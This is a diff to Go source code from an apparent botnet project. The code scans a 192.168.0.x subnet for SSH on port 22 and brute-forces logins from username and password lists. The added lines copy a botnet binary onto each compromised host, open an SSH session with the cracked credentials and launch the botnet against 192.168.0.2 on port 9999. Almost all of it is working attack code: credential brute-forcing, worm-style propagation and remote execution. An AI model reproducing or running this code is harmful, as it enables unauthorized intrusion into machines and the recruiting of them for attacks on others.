@@ -21,7 +21,7 @@ type Attack struct {
 	wg *sync.WaitGroup
 }
 
-type credentials struct {
+type credential struct {
 	username string
 	password string
 	host     string
@@ -40,12 +40,15 @@ func (a *Attack) Run() {
 		hs = append(hs, fmt.Sprintf("192.168.0.%d", i))
 	}
 
-	hosts := scanner.ScanHosts(hs)
+	s := scanner.Scanner{}
+
+	hosts := s.ScanHosts(hs)
 
 	// check if ip address has port 22 for ssh
-	for _, host := range hosts {
+	for host := range hosts {
 		port := strings.Split(host, ":")[1]
-		if port == "22" {
+		addr := strings.Split(host, ":")[0]
+		if port == "22" && addr != "192.168.0.2" {
 			fmt.Println("[*] starting brute force for", host)
 			a.wg.Add(1)
 			go a.bruteForce(host)
@@ -70,17 +73,18 @@ func (a *Attack) bruteForce(host string) {
 		return
 	}
 	var found = false
-	c := new(credentials)
+	c := new(credential)
 	for _, u := range usernames {
 		found = false
 		for _, p := range passwords {
 			if err := a.login(host, u, p); err != nil {
 				continue
 			}
-			c = &credentials{
+			c = &credential{
 				username: u,
 				password: p,
-				host:     host,
+				host:     strings.Split(host, ":")[0],
+				port:     strings.Split(host, ":")[1],
 			}
 
 			found = true
@@ -92,7 +96,32 @@ func (a *Attack) bruteForce(host string) {
 		}
 	}
 
-	fmt.Println(c)
+	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/linux/botnet", "/home/rodrigo/botnet/bin", c); err != nil {
+		fmt.Println("[ERROR] sending botnet binary")
+		return
+	}
+
+	sess, err := getSSHSession(c.host, c.username, c.password)
+	if err != nil {
+		fmt.Printf("[ERROR] creating ssh session %v\n", err)
+		return
+	}
+
+	cmd := "/home/rodrigo/botnet/bin/botnet -target 192.168.0.2 -port 9999"
+
+	if err := a.execute(cmd, sess); err != nil {
+		fmt.Printf("[ERROR] executing botnet %v\n", err)
+		return
+	}
+}
+
+func (a *Attack) execute(cmd string, sess *ssh.Session) error {
+	fmt.Println("[*] starting botnet on remote machine...")
+	if err := sess.Run(cmd); err != nil {
+		return err
+	}
+
+	return nil
 }
 
 // Login is
@@ -121,4 +150,22 @@ func getContent(file string) ([]string, error) {
 	results := strings.Split(string(f), "\n")
 
 	return results, nil
+}
+
+func getSSHSession(host, username, password string) (*ssh.Session, error) {
+	fmt.Printf("[*] Creating SSH session to %s\n", host)
+	config := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+	}
+
+	client, err := ssh.Dial("tcp", host+":22", config)
+	if err != nil {
+		return nil, err
+	}
+
+	// Create a new ssh session
+	return client.NewSession()
 }
